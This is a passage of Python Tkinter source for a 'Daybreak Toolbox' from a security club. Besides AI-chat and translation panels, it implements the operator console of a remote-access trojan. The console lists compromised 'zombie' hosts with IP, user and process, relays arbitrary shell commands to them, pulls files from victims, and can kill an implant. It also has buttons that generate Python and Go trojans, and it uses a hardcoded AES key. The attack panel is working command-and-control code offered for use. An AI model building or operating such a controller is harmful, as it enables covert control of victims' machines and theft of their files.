    # 初始设置提示语
    placeholder_text = "Shift+Enter 发送消息"
    set_placeholder(text_box, placeholder_text)

    # 绑定文本框的焦点进入和离开事件，以控制提示语的显示和隐藏
    def on_focusout(event):
        set_placeholder(event.widget, placeholder_text)

    def on_focusin(event):
        if event.widget.get("1.0", END).strip() == placeholder_text:
            event.widget.configure(state='normal', background='white')
            event.widget.delete("1.0", END)

    # 绑定文本框获取与失去焦点事件
    text_box.bind("<FocusOut>", on_focusout)
    text_box.bind("<FocusIn>", on_focusin)

    def on_one_sent(chat_box, ai_name):
        on_send(text_box, chat_box, ai_name)    # 从text_box获取请求，将结果显示在left_chat_box

    def on_sent_two(left_ai, right_ai):
        # 设置多线程完成上面两个函数的请求发送
        # on_send(text_box, left_chat_box, "kimi_ai")    # 从text_box获取请求，将结果显示在right_chat_box
        # on_send(text_box, right_chat_box, "通义千问")    # 从text_box获取请求，将结果显示在right_chat_box
        # request_thread1 = threading.Thread(target=on_one_sent, args=(left_chat_box, "kimi_ai"))
        # request_thread2 = threading.Thread(target=on_one_sent, args=(right_chat_box, "通义千问"))
        request_thread1 = threading.Thread(target=on_one_sent, args=(left_chat_box, left_ai), daemon=True)   # P1-4
        request_thread2 = threading.Thread(target=on_one_sent, args=(right_chat_box, right_ai), daemon=True)  # P1-4
        request_thread1.start()
        request_thread2.start()

    # 确定两个使用的ai模型名称
    ai_two_names = get_ai_json_use_True_name_two()

    # 绑定 Shift + Enter 组合键到发送消息的函数
    text_box.bind("<Shift-Return>", lambda event: on_sent_two(ai_two_names[0], ai_two_names[1]))

    # 创建发送按钮
    send_button = Button(ai_frame, text="发送", command=lambda: on_sent_two(ai_two_names[0], ai_two_names[1]))
    send_button.grid(row=1, column=2, padx=10, pady=5, sticky="ew")

    setup_chat_box(left_chat_box)
    setup_chat_box(right_chat_box)

    # 配置行和列的权重
    ai_frame.grid_rowconfigure(0, weight=1)  # 让滚动文本框占据主要空间
    ai_frame.grid_rowconfigure(1, weight=0)  # 当窗口大小改变时，第1行的高度不会改变。
    ai_frame.grid_columnconfigure(0, weight=1)  # 让第0列 (chat_box 和 entry) 扩展
    ai_frame.grid_columnconfigure(1, weight=1)  # 让第1列 (send_button) 不扩展


    # 设置 left_ai_frame 和 right_ai_frame 的行和列权重
    left_ai_frame.grid_rowconfigure(0, weight=1)
    left_ai_frame.grid_columnconfigure(0, weight=1)

    right_ai_frame.grid_rowconfigure(0, weight=1)
    right_ai_frame.grid_columnconfigure(0, weight=1)

    # 更新ai 的frame
    AI_ask_frame = ai_frame
    # 隐藏ai_ask
    AI_ask_frame.grid_forget()

    # 做json配置文件的初始化
    if config_ai_json_null_check() == False: # 未配置好进行初始化
        try:
            create_ai_json()
        except Exception as e:  # 报错，说明 config 文件夹未存在
            create_dir("config")
            create_ai_json()

# 创建百度翻译面板
def baidu_fanyi():
    global baidu_fanyi_frame

    # 创建主框架
    fanyi_frame = Frame(root, bg="white", highlightbackground="black", highlightthickness=1, relief="solid")
    fanyi_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)

    # 创建文本输入框提示和语言选择
    fanyi_label = Label(fanyi_frame, text="输入文本：", bg="white")
    fanyi_label.grid(row=0, column=0, sticky="w", padx=5, pady=5)

    # 创建翻译方向选择
    def toggle_translation_direction():
        global translation_direction
        # 切换语言对
        if translation_direction == ("en", "zh"):
            translation_direction = ("zh", "en")
            direction_button.config(text="翻译方向: 中文 -> 英文")
        else:
            translation_direction = ("en", "zh")
            direction_button.config(text="翻译方向: 英文 -> 中文")

    def get_translation_direction():
        # 获取当前语言对
        return translation_direction

    direction_button = Button(fanyi_frame, text="翻译方向: 英文 -> 中文", command=toggle_translation_direction)
    direction_button.grid(row=0, column=1, sticky="e", padx=5, pady=5)

    # 创建文本输入框
    input_textbox = Text(fanyi_frame, wrap="word", bg="gray90", fg="black", font=("Consolas", 11))
    input_textbox.grid(row=1, column=0, columnspan=2, sticky="nsew", padx=5, pady=5)

    # 创建输出文本提示
    output_label = Label(fanyi_frame, text="翻译结果：", bg="white")
    output_label.grid(row=2, column=0, sticky="w", padx=5, pady=5)

    # 创建输出文本框
    output_textbox = Text(fanyi_frame, wrap="word", bg="white", fg="black", font=("Consolas", 11))
    output_textbox.grid(row=3, column=0, columnspan=2, sticky="nsew", padx=5, pady=5)

    def on_translate_click(event=None):
        input_text = input_textbox.get("1.0", END).strip()
        if input_text:
            if translate_text is None:
                messagebox.showerror("翻译不可用", "百度翻译依赖缺失（requests 模块未安装）。\n请先执行：pip install -r requirements.txt")
                return
            # 获取当前选择的翻译方向
            from_lang, to_lang = get_translation_direction()

            translated_text = translate_text(input_text, from_lang=from_lang, to_lang=to_lang)
            output_textbox.delete("1.0", END)
            output_textbox.insert(END, translated_text)

    # 创建翻译按钮
    translate_button = Button(fanyi_frame, text="翻译", command=on_translate_click)
    translate_button.grid(row=5, column=0, pady=10)

    # 绑定绑定文本框获取与失去焦点事件提示语
    # 初始设置提示语
    placeholder_text = "Shift+Enter 发送消息，将默认按照字符串的第一个字符判断翻译方向"

    def set_placeholder(widget, text):
        # 设置提示语
        widget.insert("1.0", text)
        widget.config(state='disabled', background='gray90')

    def on_focusout(event):
        # 当文本框失去焦点时，检查文本框内容是否为空，如果为空则显示提示语
        if event.widget.get("1.0", END).strip() == "":
            set_placeholder(event.widget, placeholder_text)

    def on_focusin(event):
        # 当文本框获得焦点时，如果内容是提示语，则清空文本框
        if event.widget.get("1.0", END).strip() == placeholder_text:
            event.widget.config(state='normal')
            event.widget.delete("1.0", END)
            event.widget.config(state='normal')

    input_textbox.bind("<FocusOut>", on_focusout)
    input_textbox.bind("<FocusIn>", on_focusin)
    # 设置初始提示信息
    set_placeholder(input_textbox, placeholder_text)

    # 绑定回车键事件到翻译按钮
    input_textbox.bind('<Shift-Return>', on_translate_click)

    # 配置行和列的权重
    fanyi_frame.grid_rowconfigure(0, weight=0)  # 标签行
    fanyi_frame.grid_rowconfigure(1, weight=1)  # 输入文本框行，允许扩展
    fanyi_frame.grid_rowconfigure(2, weight=0)  # 输出文本框标签行
    fanyi_frame.grid_rowconfigure(3, weight=1)  # 输出文本框行，允许扩展
    fanyi_frame.grid_columnconfigure(0, weight=1)  # 让列扩展

    # 更新百度翻译的 的frame
    baidu_fanyi_frame = fanyi_frame
    # 隐藏百度翻译的 frame
    baidu_fanyi_frame.grid_forget()

# 创建肉鸡面板面板
def rouji_panel():
    global rouji_command_panel
    global client

    global rouji_json_xinxi_get

    # 隐藏画布
    # root.canvas.grid_forget()
    def update_rouji_xinxi(rouji_xinxi):
        # print("进行表格的更新")
        # 获取 Treeview 中所有的子项ID 清空tree
        items = tree.get_children()
        if len(items) > 0:
            # 遍历并删除每个子项
            for item in items:
                tree.delete(item)

        # 检查是否有肉鸡连接
        if len(rouji_xinxi) == 0:
            tree.insert('', 'end', values=("-","-","-","-","-","-"))
        else:
            # tree.delete("item_id") # 删除指定项
            for rouji_id in list(rouji_xinxi.keys()):
                user = rouji_xinxi[rouji_id].get("rouji_user", "未知")
                process = rouji_xinxi[rouji_id].get("rouji_process", "未知")
                connect_time = rouji_xinxi[rouji_id].get("rouji_time", "未知")
                tree.insert('', 'end', values=(rouji_id, rouji_xinxi[rouji_id]["rouji_ip"], rouji_xinxi[rouji_id]["rouji_port"], user, process, connect_time))

    # 单一自动刷新定时器 id，避免多个触发点（手动刷新 / 下载完成 / 连接成功）各自
    # root.after(5000, ...) 叠加出多条 5s 刷新链，导致服务端流量翻倍
    auto_refresh_id = [None]

    def get_rouji_json_xinxi():
        global rouji_xinxi, rouji_json_xinxi_get

        if config_server_json_null_check():
            if not rouji_json_xinxi_get:
                return
            # 取消已挂起的自动刷新，保证同一时刻只有一条 5s 刷新链
            if auto_refresh_id[0] is not None:
                root.after_cancel(auto_refresh_id[0])
                auto_refresh_id[0] = None
            # 发送命令和接收命令
            client.send("rouji_json_xinxi".encode("UTF-8"))
            # rouji_xinxi = json.loads(client.recv(4096).decode("UTF-8"))
            rouji_xinxi = json.loads(recv_result(client))
            # 更新展示
            update_rouji_xinxi(rouji_xinxi)
            # 之后每5s 自动进行更新操作（复用同一个定时器 id）
            auto_refresh_id[0] = root.after(5000, get_rouji_json_xinxi)
        else:
            messagebox.showinfo("错误","请先进行服务端的连接！\n请将工具箱目录下的server.py文件运行在放在双方都可访问的服务器上\n并配置服务端连接")

    def popup_menu(event):
        item_id = tree.identify_row(event.y)
        if item_id:
            tree.selection_set(item_id)  # 选择该行
            rouji_ID = tree.item(item_id, 'values')[0]

            # 创建弹出菜单
            menu = Menu(root, tearoff=0)
            # menu.add_command(label="编辑", command=lambda: print("编辑"))
            menu.add_command(label="删除", command=lambda: delete_server_C(rouji_ID))
            menu.add_separator()
            menu.add_command(label="打开命令行", command=lambda: focus_command_line(rouji_ID))
            menu.add_separator()
            menu.add_command(label="刷新", command=lambda: get_rouji_json_xinxi())
            # menu.add_separator()
            # 在鼠标点击位置显示菜单
            menu.post(event.x_root, event.y_root)

    # 创建包含Treeview的Frame
    rouji_frame = Frame(root, bg="white", highlightbackground="black", highlightthickness=1, relief="solid")
    rouji_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)

    # 创建分割窗口
    paned_window = PanedWindow(rouji_frame, orient=VERTICAL)
    paned_window.pack(expand=True, fill=BOTH)
    # 创建Treeview控件并设置字体
    style = ttk.Style()
    style.configure("Treeview", font=('Consolas', 11))
    style.configure("Treeview.Heading", font=('Consolas', 11, 'bold'))
    tree = ttk.Treeview(rouji_frame, columns=('ID','IP', 'Port', 'User', 'Process', 'time'), show='headings', style="Treeview")

    tree.heading('ID', text='肉鸡ID')
    tree.heading('IP', text='IP地址')
    tree.heading('Port', text='端口')
    tree.heading('User', text='用户名')
    tree.heading('Process', text='进程名称')
    tree.heading('time', text='连接时间')

    tree.column('ID', width=50, anchor='center')
    tree.column('IP', width=100, anchor='center')
    tree.column('Port', width=50, anchor='center')
    tree.column('User', width=150, anchor='center')
    tree.column('Process', width=100, anchor='center')
    tree.column('time', width=150, anchor='center')

    # tree.insert('', 'end', values=("请刷新","请刷新","请刷新","请刷新","请刷新","请刷新"))
    # 将信息添加到Treeview中
    # update_rouji_xinxi()
    tree.bind("<Button-3>", popup_menu) # 绑定右键事件
    paned_window.add(tree)  # 添加Treeview到分割窗口
    # -------------------------------------------------------
    ### 下方命令行控件
    # -------------------------------------------------------
    def aes_decrypt(encrypted_data: str, key: bytes) -> bytes:
        print(f"encrypted_data: {encrypted_data}")
        raw_data = base64.b64decode(encrypted_data)
        iv = raw_data[:AES.block_size]
        ciphertext = raw_data[AES.block_size:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
        return plaintext

    # 字节转为明文
    def data_Byte_chardet(data_bytes):
        # 先尝试 UTF-8
        try:
            return data_bytes.decode('utf-8')
        except UnicodeDecodeError:
            # UTF-8 失败，尝试 GBK
            try:
                return data_bytes.decode('gbk')
            except UnicodeDecodeError:
                # 最后用 chardet 检测
                detected = chardet.detect(data_bytes)
                encoding = detected.get('encoding', 'utf-8')
                # 如果检测到 ascii，改用 gbk（因为 Windows 中文环境）
                if encoding.lower() == 'ascii':
                    encoding = 'gbk'  # 或 'utf-8'
                return data_bytes.decode(encoding, errors='ignore')


    def recv_result(client_socket):
        """
        接收数据：先读44字节长度前缀，再读实际数据。
        循环累积防 TCP 拆包；对端关闭时抛异常，避免死循环。
        """
        print('---')

        def _recv_exactly(n):
            buf = b''
            while len(buf) < n:
                chunk = client_socket.recv(n - len(buf))
                if not chunk:
                    raise ConnectionError("服务端连接已关闭")
                buf += chunk
            return buf

        data = _recv_exactly(44)
        length_bytes = aes_decrypt(data, b'0123456789abcdef')
        # 2. 解包获取实际数据长度
        data_length = int(length_bytes.decode('utf-8'))
        # 3. 根据长度读取实际数据（data_length 为 0 时为空字节）
        data_bytes = _recv_exactly(data_length) if data_length > 0 else b''
        print(f"接收 -> {data_length} 字节")
        print(f"实际接收 -> {len(data_bytes)} 字节")

        data = data_Byte_chardet(data_bytes)

        print(data)
        print(f"接收完成 -> 共 {len(data.encode('utf-8'))} 字节")

        return data

    def get_command_line(rouji_ID):
        # 显示命令提示符
        command_line.insert(END, f"{rouji_ID} #> ", "orange")
        command_line.focus()  # 将焦点设置到命令行

    # 回车enter 事件
    def focus_command_line(rouji_ID):
        # 清空命令行
        command_line.delete("1.0", END)
        # 显示命令提示符
        command_line.insert(END, f"{rouji_ID} #> ", "orange")
        command_line.focus()  # 将焦点设置到命令行

    def delete_server_C(rouji_ID):
        # 后台发送 exit，避免 time.sleep(1) 阻塞 UI；清空命令行回主线程执行
        def _do():
            try:
                client.send(f"{rouji_ID} #> exit".encode("UTF-8"))
            except Exception as e:
                print(f"删除肉鸡命令发送失败: {e}")
        threading.Thread(target=_do, daemon=True).start()
        root.after(1000, lambda: command_line.delete("1.0", END))

    def handle_return(event):
        # 获取输入的命令
        input_line = command_line.get("end-2c linestart", "end-1c").strip()
        # 使用re.search查找匹配
        match = input_line.split('#>')  # 切割 > 前后的内容变成数组
        # 如果找到匹配项，输出匹配的内容
        try:
            if match[1]:
                execute_command(match[0].strip(),match[1].strip())
            else:
                command_line.insert(END, "\n")  # 添加换行符
        except Exception:
            command_line.insert(END, "\n")  # 添加换行符
        # 插入新的提示符
        command_line.insert(END, f"{match[0].strip()} #> ", "orange")
        command_line.mark_set(INSERT, END)   # 将光标移动到提示符的后面
        command_line.see(END)  # 滚动到最新行
        return "break"

    def execute_command(rouji_ID,command):
        # 添加换行符以确保结果在新的一行开始
        command_line.insert(END, "\n")

        if command.startswith('cd '):
            # change_directory(command[3:].strip())
            change_directory(rouji_ID,command)
        elif command == 'ls':
            list_directory(rouji_ID,command)
        # elif command == 'pwd':
        # run_system_command(rouji_ID,command)
        elif command == 'exit': # 已完成
            # quit()
            clear_screen()
        elif command == 'clear':    # 已完成
            clear_screen()
        elif command == 'help':
            # 显示帮助信息
            help_info = """可用命令：
        cd <目录> - 切换目录(cd c:)
        dir - 列出当前目录内容
        pwd - 显示当前目录路径
        exit - 杀掉该肉鸡
        help - 显示此帮助信息
        get <文件路径> - 下载文件
        start <exe文件路径> - 后台启动exe文件
        
        其他命令将被发送到远程服务器执行"""
            command_line.insert(END, help_info + "\n")
        elif command.startswith('get '):
            # 下载文件
            download_file(rouji_ID,command)
        else:   # 已完成
            run_system_command(rouji_ID,command)
        # 将光标移动到提示符的后面
        command_line.mark_set(INSERT, END)
        command_line.see(END)  # 滚动到最新行

    def download_file(rouji_ID,command):
        global rouji_json_xinxi_get
        print(f"发送下载文件命令 {command}")
        rouji_json_xinxi_get = False
        # 发送命令
        client.send(f"{rouji_ID} #> {command}".encode("UTF-8"))

        polling_done = False  # 标志位，用于指示轮询是否完成

        def poll_file_data():
            nonlocal polling_done  # 使用 nonlocal 声明，以便访问外部作用域中的变量
            global rouji_json_xinxi_get
            try:
                # select 超时为 0，立即返回
                readable, _, _ = select.select([client], [], [], 0)

                if readable:
                    result = recv_result(client)
                    command_line.insert(END, result + "\n")
                    command_line.see(END)
                    command_line.mark_set(INSERT, END)

                    if "[success]" in result:
                        print("文件传输成功")
                    elif "[fail]" in result or "[error]" in result:
                        print("文件传输失败")

                    if result == "[finish]":
                        print("文件接收完成")
                        # command_line.insert(END, "[finish]\n")
                        rouji_json_xinxi_get = True
                        get_rouji_json_xinxi()
                        polling_done = True
                        return  # 结束轮询
                # 100ms 后继续检查
                root.after(100, poll_file_data)
            except Exception as e:
                print(f"接收数据错误: {e}")
                command_line.insert(END, f"接收数据错误: {e}\n")
                rouji_json_xinxi_get = True
                get_rouji_json_xinxi()
                polling_done = True  # 出现异常时也将标志设置为 True

        poll_file_data()
        # command_line.insert(END, "[finish] 文件接收结束" + "\n")

        while not polling_done:
            root.update()  # 更新 UI，使得 Tkinter 能够处理事件


        # while True:
        #     result = recv_result(client)
        #     command_line.insert(END, result + "\n")
        #
        #     if result == "[finish]":
        #         print("文件接收完成")
        #         command_line.insert(END, "[finish]" + "\n")
        #         rouji_json_xinxi_get = True
        #         get_rouji_json_xinxi()
        #         break

        # 发送命令后，准备接收工作
        # data = client.recv(4096)
        # encoding = chardet.detect(data)['encoding']     # chardet来进行编码设置
        # result = data.decode(encoding)
        # result = recv_result(client)

        # command_line.insert(END, result + "\n")

    def change_directory(rouji_ID,command):
        # 记录命令
        change_dir = command[3:].strip()
        # 发送命令
        client.send(f"{rouji_ID} #> {command}".encode("UTF-8"))
        # 发送命令后，准备接收工作
        # data = client.recv(4096)
        # encoding = chardet.detect(data)['encoding']     # chardet来进行编码设置
        # result = data.decode(encoding)
        result = recv_result(client)

        command_line.insert(END, result + "\n")

    def list_directory(rouji_ID,command):
        try:
            # 发送指令 ls
            client.send(f"{rouji_ID} #> {command}".encode("UTF-8"))
            # 发送命令后，准备接收工作
            # data = client.recv(4096)
            # encoding = chardet.detect(data)['encoding']     # chardet来进行编码设置
            # files = data.decode(encoding)
            files = recv_result(client)
            # ----------------------------------
            # files = os.listdir()
            for file in files:
                command_line.insert(END, f"{file}\n")
        except PermissionError:
            command_line.insert(END, "No permission to list directory contents\n")

    def run_system_command(rouji_ID,command):
        try:
            # 执行系统命令
            # result = subprocess.run(command, shell=True, text=True, capture_output=True)
            client.send(f"{rouji_ID} #> {command}".encode("UTF-8"))
            # 发送命令后，准备接收工作
            # data = client.recv(4096)
            result = recv_result(client)

            # encoding = chardet.detect(data)['encoding']     # chardet来进行编码设置
            # result = data.decode(encoding)
            # 处理命令执行结果
            # print(result)
            # command_line.insert(END, result.stdout)
            command_line.insert(END, result + "\n")
            # if result.stderr:
            #     command_line.insert(END, result.stderr)
        except Exception as e:
            command_line.insert(END, f"Error: {e}\n")
    def clear_screen():
        # 清除文本框中的所有内容
        command_line.delete("1.0", END)
    ### ----------------------------------------------------------------------
    nav_frame_two = Frame(paned_window)
    nav_frame_two.pack(expand=True, fill=X)  # 使用pack使其填充可用空间

    # 配置行和列的权重
    nav_frame_two.grid_rowconfigure(0, weight=3)  # 设定第一行的权重为3
    # 第二行不设置权重，保持固定高度
    nav_frame_two.grid_columnconfigure(0, weight=1)  # 设定第一列的权重为1
    nav_frame_two.grid_columnconfigure(2, weight=1)  # 设定第三列的权重为1

    # 创建命令行控件
    # command_line = Text(nav_frame_two, height=10, bg="gray90", fg="black", font=("Microsoft YaHei", 10, "bold"))  # 使用Text控件作为命令行
    command_line = Text(nav_frame_two, height=10, bg="gray90", fg="black", font=("Consolas", 11))  # 使用Text控件作为命令行，字体与临时笔记保持一致
    command_line.grid(row=0, column=0, columnspan=9,sticky=NSEW)  # 使用grid使其填

    # 绑定 enter 回车 事件
    command_line.bind("<Return>", lambda event: handle_return(event))

    # --------------------------------------------------------------------
    # 链接服务端
    def muma_listen_setting():
        global client

        server_IP = server_IP_entry.get()
        server_Port = int(server_Port_entry.get())
        try:
            # 创建tcp连接
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # TCP连接
            # 设置连接超时时间为5秒
            client.settimeout(10)
            # 连接服务端
            client.connect((server_IP, server_Port-1))
            messagebox.showinfo("成功！","服务端连接成功！")

            # 保存到文件中
            json_info = {
                "server_ip"     :   server_IP,
                "server_port"   :   server_Port
            }

            save_server_json(json_info) # 保存信息到本地

            # 连接成功后开始自动刷新肉鸡信息（用 after 替代 time.sleep(0.5)，避免阻塞 UI）
            root.after(500, get_rouji_json_xinxi)
        except:
            messagebox.showinfo("错误！","请正确填写信息！")

    server_json = {"server_ip":"","server_port":0}

    if config_server_json_null_check():
        server_json = get_server_json()

    # 配置button_frame的列权重
    label_IP = Label(nav_frame_two, text="连接IP:")
    label_IP.grid(row=1, column=0, padx=(0, 10), sticky='e')  # 对齐到列的东侧
    server_IP_entry = Entry(nav_frame_two, textvariable=StringVar(value=server_json["server_ip"]))
    server_IP_entry.grid(row=1, column=1, padx=(10, 0), sticky='w')  # 紧随label之后

    label_Port = Label(nav_frame_two, text="连接端口:")
    label_Port.grid(row=1, column=2, padx=(0, 10), sticky='e')  # 对齐到列的东侧
    server_Port_entry = Entry(nav_frame_two, textvariable=StringVar(value=server_json["server_port"]))
    server_Port_entry.grid(row=1, column=3, padx=(10, 0), sticky='w')  # 紧随label之后

    button1 = Button(nav_frame_two, text="连接服务端", command=muma_listen_setting)
    button1.grid(row=1, column=4, padx=(10, 50),sticky="w")

    button2 = Button(nav_frame_two, text="生成py木马", command=add_py_muma)
    button2.grid(row=1, column=5, padx=(10, 10),sticky="w")

    button3 = Button(nav_frame_two, text="生成pyexe木马", command=add_py_exe_muma)
    button3.grid(row=1, column=6, padx=(10, 10),sticky="w")

    button4 = Button(nav_frame_two, text="生成Go木马", command=add_go_muma)
    button4.grid(row=1, column=7, padx=(10, 10),sticky="w")

    button5 = Button(nav_frame_two, text="生成Goexe木马", command=add_go_exe_muma)
    button5.grid(row=1, column=8, padx=(10, 10),sticky="w")

    # ----------------------------------------------------------------------

    paned_window.add(nav_frame_two)  # 添加命令行frame到分割窗口

    # 更新百度翻译的 的frame
    rouji_command_panel = rouji_frame
    # 隐藏百度翻译的 frame
    rouji_command_panel.grid_forget()

def on_closing():
    # 关闭客户端
    try:
        client.send("exit".encode("UTF-8"))
        client.close()
    except:
        pass

    # 清空服务端连接信息
    # delete_server_json()
    root.destroy()

# 定义一个方法来更新文本的水平位置，禁止上下间距改变
def update_position(event, text_id, frame):
    # 检查 canvas 是否有效
    if not canvas.winfo_exists():
        return

    # 获取当前画布的实际宽度
    canvas_width = canvas.winfo_width()

    # 更新文本位置（水平居中，保持垂直位置不变）
    y_position_text = canvas.coords(text_id)[1]  # 获取当前文本的y坐标，不改变
    x_position_text = canvas_width / 2  # 水平居中
    canvas.coords(text_id, x_position_text, y_position_text)

    # 更新Frame的位置（水平居中，保持垂直位置不变）
    y_position_frame = canvas.coords(frame)[1]  # 获取当前frame的y坐标，不改变
    x_position_frame = canvas_width / 2  # 水平居中
    canvas.coords(frame, x_position_frame, y_position_frame)

def main():
    global canvas, root, text_id, frame_id

    # 在展示菜单栏前要先创建临时笔记
    create_note()

    # 再创建 AI 对话
    if int(get_ai_json_use_page()) == 2:
        create_ai_ask_two()
    else:
        create_ai_ask()

    # 再创建本地终端
    # create_local_cmd()

    # 再创建百度翻译
    baidu_fanyi()

    # 再创建肉鸡面板
    rouji_panel()

    # 再创建编解码
    create_encode_decode()

    show_menu()     # 展示菜单栏

    # 设置菜单栏首页
    menu_names = get_menu_name_all()
    if len(menu_names) > 0:
        reload_canvas(menu_name=menu_names[0])
    else:   # 在首页上写一些标语
        canvas.create_text(canvas_width / 2 , canvas_height * 0.05 + 130, text="破晓·工具箱（Daybreak Toolbox）- Daybreak网络安全协会", font=("Helvetica", 20), fill="lightgray", tags="my_text")
        # 绑定窗口大小变化事件，触发文本位置更新
        # root.bind("<Configure>", lambda event, text_ids=(text_id, text_id2): update_text_position(event, *text_ids))


    # 绑定关闭事件
    root.protocol("WM_DELETE_WINDOW", on_closing)  # 绑定关闭事件

    root.mainloop()  # 创建窗口视图

if __name__ == '__main__':
    main()